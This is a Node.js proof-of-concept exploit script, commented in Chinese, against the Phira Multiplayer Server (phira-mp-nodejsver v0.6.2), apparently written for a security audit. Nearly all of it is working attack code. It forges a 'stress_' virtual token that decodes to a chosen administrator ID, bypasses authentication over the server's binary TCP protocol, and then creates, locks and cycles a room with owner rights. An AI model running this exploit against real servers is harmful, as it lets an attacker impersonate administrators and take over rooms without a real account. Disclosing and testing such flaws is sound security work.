/**
 * PoC #1  [CRITICAL] 虚拟 Token 认证绕过 + 提权为 Admin
 * 目标: Phira Multiplayer Server (phira-mp-nodejsver v0.6.2)
 * 原理: src/domain/protocol/handlers/auth.ts
 *   const isVirtualToken = token.startsWith('stress_') && process.env.NODE_ENV !== 'production';
 *   .env 实际 NODE_ENV=development，故任意 20 字符且以 stress_ 开头的 token 均可通过认证。
 *   id = (parseInt(token.slice(7,15), 36) % 900000) + 100000  —— 完全可控，可精确命中 ADMIN_PHIRA_ID。
 * 利用: 用构造的 id 创建房间、锁定房间、切换循环模式 —— 全部无需真实 Phira 账号。
 *
 * 协议: 连接建立后先发送 1 字节协议版本(0x01)，之后每个包 = [ULEB 长度][payload]。
 * 用法: node work/poc/01-auth-bypass.js [host] [port] [adminId]
 */
'use strict';
const net = require('net');

const HOST = process.argv[2] || '127.0.0.1';
const PORT = parseInt(process.argv[3] || '666', 10);
const TARGET_ID = parseInt(process.argv[4] || '706786', 10); // .env ADMIN_PHIRA_ID[0]
const PROTOCOL_VERSION = 1;

// ---- 二进制编解码 (对齐 src/domain/protocol/BinaryProtocol.ts / Commands.ts) ----
function uleb(n) {
  const out = []; let v = BigInt(n);
  for (;;) { let b = Number(v & 0x7fn); v >>= 7n; if (v !== 0n) b |= 0x80; out.push(b); if (v === 0n) break; }
  return Buffer.from(out);
}
class W {
  constructor() { this.b = []; }
  u8(v) { this.b.push(Buffer.from([v & 0xff])); }
  i32(v) { const x = Buffer.alloc(4); x.writeInt32LE(v); this.b.push(x); }
  str(s) { const x = Buffer.from(s, 'utf8'); this.b.push(uleb(x.length), x); }
  bool(v) { this.u8(v ? 1 : 0); }
  out() { return Buffer.concat(this.b); }
}
class R {
  constructor(buf) { this.b = buf; this.p = 0; }
  u8() { return this.b[this.p++]; }
  uleb() { let r = 0n, s = 0n; for (;;) { const x = this.b[this.p++]; r |= BigInt(x & 0x7f) << s; if (!(x & 0x80)) return r; s += 7n; } }
  i32() { const v = this.b.readInt32LE(this.p); this.p += 4; return v; }
  str() { const n = Number(this.uleb()); const v = this.b.toString('utf8', this.p, this.p + n); this.p += n; return v; }
  bool() { return this.u8() === 1; }
}

// 由目标 id 反推 token：base36(id-100000) 补足 8 位 → 'stress_' + 8位 + 'xxxxx'
function forgeToken(rawId) {
  if (rawId < 100000 || rawId >= 1000000) throw new Error('id 需在 [100000,999999] 区间');
  const enc = (rawId - 100000).toString(36).padStart(8, '0');
  const token = 'stress_' + enc + 'xxxxx';
  if (token.length !== 20) throw new Error('token 长度错误: ' + token.length);
  return { token, decoded: (parseInt(enc, 36) % 900000) + 100000 };
}

class Client {
  constructor(onFrame) { this.sock = null; this.buf = Buffer.alloc(0); this.onFrame = onFrame; }
  connect() {
    return new Promise((res, rej) => {
      this.sock = net.createConnection({ host: HOST, port: PORT }, () => {
        this.sock.write(Buffer.from([PROTOCOL_VERSION])); // 版本字节，仅发送一次
        res();
      });
      this.sock.on('error', rej);
      this.sock.on('data', (d) => { this.buf = Buffer.concat([this.buf, d]); this.drain(); });
    });
  }
  drain() {
    for (;;) {
      let i = 0, len = 0, shift = 0, done = false;
      while (i < this.buf.length) {
        const b = this.buf[i++]; len |= (b & 0x7f) << shift; shift += 7;
        if (!(b & 0x80)) { done = true; break; }
      }
      if (!done || this.buf.length < i + len) return;
      const payload = this.buf.subarray(i, i + len);
      this.buf = this.buf.subarray(i + len);
      try { this.onFrame(payload); } catch (_) {}
    }
  }
  send(payload) { this.sock.write(Buffer.concat([uleb(payload.length), payload])); }
  close() { if (this.sock) this.sock.destroy(); }
}

const cmd = {
  auth: (c, t) => { const w = new W(); w.u8(1); w.str(t); c.send(w.out()); },
  create: (c, id) => { const w = new W(); w.u8(5); w.str(id); c.send(w.out()); },
  lock: (c, v) => { const w = new W(); w.u8(8); w.bool(v); c.send(w.out()); },
  cycle: (c, v) => { const w = new W(); w.u8(9); w.bool(v); c.send(w.out()); },
};

const results = [];
(async () => {
  const { token, decoded } = forgeToken(TARGET_ID);
  console.log('=== PoC#1 虚拟 Token 认证绕过 + 提权为 Admin ===');
  console.log(`目标服务器     : ${HOST}:${PORT}`);
  console.log(`构造 admin id  : ${TARGET_ID}`);
  console.log(`伪造 token     : ${token} (长度 ${token.length})`);
  console.log(`token 自解码 id: ${decoded}  -> ${decoded === TARGET_ID ? '命中 ✓' : '不匹配 ✗'}`);
  console.log('----------------------------------------');

  let authenticated = false, gotId = null, roomCreated = false, roomLocked = false, roomCycled = false;

  const client = new Client((payload) => {
    const r = new R(payload); const type = r.u8();
    if (type === 1) { // Authenticate
      if (r.bool()) {
        gotId = r.i32(); const name = r.str();
        authenticated = true;
        console.log(`[+] 认证成功! 服务端分配 id=${gotId} name="${name}"`);
        console.log(`[+] 是否等于管理员 id(${TARGET_ID}): ${gotId === TARGET_ID ? '是 ✓ (已获得管理员身份)' : '否'}`);
        results.push({ test: '虚拟token认证绕过', pass: true });
        results.push({ test: '伪造为管理员ID', pass: gotId === TARGET_ID });
        cmd.create(client, 'poc-' + Math.random().toString(36).slice(2, 7));
      } else { console.log('[-] 认证失败: ' + r.str()); results.push({ test: '虚拟token认证绕过', pass: false }); finish(); }
    } else if (type === 8) { // CreateRoom
      if (r.bool()) { roomCreated = true; console.log('[+] 成功创建房间'); cmd.lock(client, true); }
      else { console.log('[-] 创建房间失败: ' + r.str()); results.push({ test: '创建房间', pass: false }); finish(); }
    } else if (type === 12) { // LockRoom
      roomLocked = r.bool();
      console.log(roomLocked ? '[+] 成功锁定房间 (房主权限)' : '[-] 锁定失败: ' + r.str());
      results.push({ test: '创建房间', pass: roomCreated });
      results.push({ test: '锁定房间(房主权限)', pass: roomLocked });
      if (roomLocked) cmd.cycle(client, true); else finish();
    } else if (type === 13) { // CycleRoom
      roomCycled = r.bool();
      console.log(roomCycled ? '[+] 成功切换循环模式 (房主权限)' : '[-] 切换失败');
      results.push({ test: '切换循环模式(房主权限)', pass: roomCycled });
      finish();
    }
  });

  await client.connect();
  console.log('[*] TCP 已连接，发送伪造认证…');
  cmd.auth(client, token);
  await new Promise((r) => setTimeout(r, 2500));
  finish();

  function finish() {
    if (finish.done) return; finish.done = true;
    client.close();
    console.log('----------------------------------------');
    console.log('结论: ' + (authenticated
      ? '漏洞确认 —— NODE_ENV!=production 时 stress_ token 可绕过认证，并伪造任意用户(含管理员)身份。'
      : '未复现（服务端可能已设 NODE_ENV=production）'));
    console.log(JSON.stringify(results));
    process.exit(authenticated ? 0 : 2);
  }
})().catch((e) => { console.error('运行失败: ' + e.message); process.exit(1); });
